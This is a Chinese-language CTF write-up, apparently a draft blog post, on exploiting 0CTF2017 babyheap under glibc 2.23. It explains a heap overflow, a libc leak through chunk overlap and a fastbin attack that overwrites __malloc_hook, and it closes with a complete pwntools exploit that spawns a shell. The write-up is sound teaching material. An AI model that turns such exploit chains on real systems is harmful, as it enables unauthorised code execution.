---
title: 从零开始的堆利用 01
published: 2026-10-19T13:00:00.000Z
description: 记一次glibc-2.23 fastbin attack
tags:
  - pwn
  - glibc
category: Heap
draft: true
lang: zh_CN
---

# 从零开始的堆利用 01

> 从 0CTF2017 - babyheap 看 glibc2.23 下的 fastbin attack

## 逆向分析

修出以下结构体，当然也有其他的修法。padding 和 flag 合并成 `__int64` 也是没有影响的。

```c
struct chunk
{
  int flag;
  int padding;
  __int64 size;
  char *data;
};
```

程序的主要漏洞如下

```c
unsigned __int64 __fastcall fill_chunk(chunk_t *list)
{
  unsigned __int64 num; // rax
  int id; // [rsp+18h] [rbp-8h]
  int size; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  num = get_num();
  id = num;
  if ( (unsigned int)num < 0x10 )
  {
    num = (unsigned int)list[(int)num].flag;
    if ( (_DWORD)num == 1 )
    {
      printf("Size: ");                         // 不限制输入大小
      num = get_num();
      size = num;
      if ( (int)num > 0 )
      {
        printf("Content: ");
        return get_data(list[id].data, size);
      }
    }
  }
  return num;
}
```

因为 `fill_chunk()` 函数并没有对修改 chunk 内容时输入的 size 与申请 chunk 时设置的 `list[id].size` 比较，所以有堆溢出漏洞可以利用。在 glibc 2.23 下还没有 tcache bin ，常见的方式是通过 fastbin attack 将 `__malloc_hook()` 改为 one gadget 。

首先需要泄露 libc 地址，常见的方式是使用 unsorted bin 来泄露，但是通过 `calloc()` 来申请 chunk 时会将内存全部初始化为 0 。这里利用的方法是通过堆溢出制造堆块重叠 (overlap) 后 free 再申请，将仍在 unsorted bin 中的 chunk 的 bk 和 fd 正好落在后面 chunk 上，就可以直接读出来。

由于 overlap 导致的 UAF (对吧对吧~有指向已释放内存的指针)

```python
add(0x10)   # 0
add(0x40)   # 1
add(0x10)   # 2
add(0x40)
add(0x80)   # 4
payload = p64(0)*3 + p64(0xC1) 
fill(0,len(payload),payload)
free(1)
add(0x40)   # 1
dump(2)
```

之后是常规的 fastbin attack 打法了，从 fastbin 链表中取出元素的时候会检测 size 位是否和当前链表的 size 位匹配，因此不能随意将 chunk 申请到 malloc_hook 或者 free_hook在 __malloc_hook 上方还有一个 hook，那里会有一些 libc 的指针， libc 地址一般都是 0x7f 开头的，那么就可以调整一下偏移，利用这个 0x7f 构造一个合法的 size 位，劫持 fd 将 chunk 申请到 malloc_hook - 0x23 的位置，所以 size 应该就是 0x7f 了，然后我们修改 malloc_hook 为 one_gadget，最后随便 malloc 一下拿到 shell

## EXP

完整 exp 如下

```python
from pwn import *
context(arch='amd64', log_level='debug', os='linux')
# context.terminal = ['tmux', 'new-window']

# glibc 2.23 堆溢出

# 泄露思路：释放堆块重叠后产生的大堆块到 Unsorted bin 后申请小 chunk , 使申请后 unsorted bin 的 bk 落在下一个chunk上，通过 dump 泄露

io = process('./pwn')
# io = remote('', )
elf = ELF('./pwn')
libc=ELF('./libc-2.23.so')

def menu(choice):
    io.sendlineafter("Command:",str(choice).encode())

def add(size):
    menu(1)
    io.sendlineafter("Size:" ,str(size).encode())

def fill(id,size,data:bytes):
    menu(2)
    io.sendlineafter("Index:" ,str(id).encode())
    io.sendlineafter("Size:" ,str(size).encode())
    io.sendlineafter("Content:",data)

def free(id):
    menu(3)
    io.sendlineafter("Index:" ,str(id).encode())

def dump(id):
    menu(4)
    io.sendlineafter("Index:" ,str(id).encode())

def exit():
    menu(5)

sc = '''break  *$rebase(0x113D)
c
'''

add(0x10)   # 0
add(0x40)   # 1
add(0x10)   # 2
add(0x40)

add(0x80)   # 4

payload = p64(0)*3 + p64(0xC1) 
fill(0,len(payload),payload)
free(1)

add(0x40)   # 1
dump(2)
gdb.attach(io, sc)

io.recvuntil(b'Content: \n')
libc_base=(u64(io.recv(8)))-0x3c4b78
log.success(f"libc address -> {hex(libc_base)}")
malloc_hook=libc_base+libc.symbols["__malloc_hook"]
fake_chunk=malloc_hook-0x23

ogg2=0x4526a
ogg3=0xf02a4
ogg4=0xf1147

ogg=libc_base+ogg2

add(0x60)
add(0x60)
free(6)
free(5)

fill(2,len(p64(fake_chunk)),p64(fake_chunk))

add(0x60)
add(0x60)

payload = b'a'*0x13+p64(ogg)

fill(6,len(payload),payload)

add(0x20)

io.interactive()

```
